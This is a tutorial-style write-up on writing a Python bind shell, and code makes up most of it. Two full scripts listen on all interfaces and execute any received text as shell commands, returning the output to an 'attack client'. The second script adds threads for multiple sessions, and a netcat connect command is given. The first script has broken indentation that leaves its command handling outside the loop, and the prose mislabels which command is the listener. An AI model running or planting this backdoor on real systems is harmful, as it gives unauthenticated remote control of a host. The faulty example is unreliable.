# Python Bind Shell

A bind shell is a process that binds to an IP address and port on a host machine to listen to incoming connections. The shell repeatedly listens for bytes sent to it and treats them as raw commands to be executed as a system subprocess. Once all bytes have been recieved, it runs the command on the host and returns the output.

A crude example of a bind shell is as follows:

>import socket
>import subprocess
>import click
>
>def run_cmd(cmd):
>	output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
>	return output.stdout
>	
>\@click.command()
>\@click.option('--port', '-p', default=4444)
>def main(port):
>	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>	s.bind(('0.0.0.0', port))
>	s.listen(4)
>	client_socket, address = s.accept()
>	
>	while True:
>		chunks = \[]
>		chunk = client_socket.recv(2048)
>		chunks.append(chunk)
>	cmd = (b''.join(chunks)).decode()\[:-1]
>	
>	if cmd.lower() == 'exit':
>		client_socket.close()
>		break
>		
>	output = run_cmd(cmd)
>	client_socket.sendall(output)
>	
>if \_\_name\_\_ == '\_\_main\_\_':
>	main()

This code contains a wrapper function for execution and a main function to contain the logic.

The main function sets up a socket and binds it to 0.0.0.0 (all available interfaces) and the specified port. Then it is configured to allow up to four unaccepted connections before refusing more - this is configured by the listen() function. The socket then accepts new incoming connections, this is known as a blocking call. The code will stop at this line, when connections are established, accept call returns two things to the variables client_socket and 'address'.

Inside the while loop, the following is happening:

- all incoming bytes from the attack client are recieved.
- incoming bytes are converted to cmd string.
- the connection is closed if 'cmd' is 'exit'.
- otherwise the command is executed locally and output is returned to the attack client.

The last byte of the cmd string is removed because it is a 'newline' byte from pressing the enter key.

We can use nc (netcat) on the attack client to connect to the bind shell and gain remote code execution with the following command:

>python bindshell.py --port 4444

We can then run the following command to start the listener after running the script:

>nc 10.10.10.10 4444 -nv

### Supporting Multiple Connections

A disadvantage to this method is that the process will stop when we disconnect our shell. This can be remedied by introducing threads that run the command execution part of the code. This creates a new thread every time a machine connects to our shell.

A simplified explanation of threads, is that they enable us to run different pieces of code concurrently - this is distinctly different than parallel. This means that while one thread is performing a process, another is available to receive a new connection. This allows for multiple executions on the target machine.

The code that includes thread implementation is as follows:

>import socket
>import subprocess
>import click
>from threading import Thread
>
>def run_cmd(cmd):
>	output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
>	return output.stdout
>	
>def handle_input(client_socket):
>	while True:
>		chunks = \[]
>		chunk = client_socket.recv(2048)
>		chunks.append(chunk)
>		while len(chunk) != 0 and chr(chunk\[-1]) != '\\n':
>			chunk = client_socket.recv(2048)
>			chunks.append(chunk)
>		cmd = (b''.join(chunks)).decode()\[:-1]
>		
>		if cmd.lower() == 'exit':
>			client_socket.close()
>			break
>			
>		output = run_cmd(cmd)
>		client_socket.sendall(output)
>	
>\@click.command()
>\@click.option('--port', '-p', default=4444)
>def main(port):
>	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>	s.bind(('0.0.0.0', port))
>	s.listen(4)
>	
>	while True:
>		client_socket, \_ = s.accept()
>		t = Thread(target=handle_input, args=(client_socket, ))
>		t.start()
>	
>if \_\_name\_\_ == '\_\_main\_\_':
>	main()
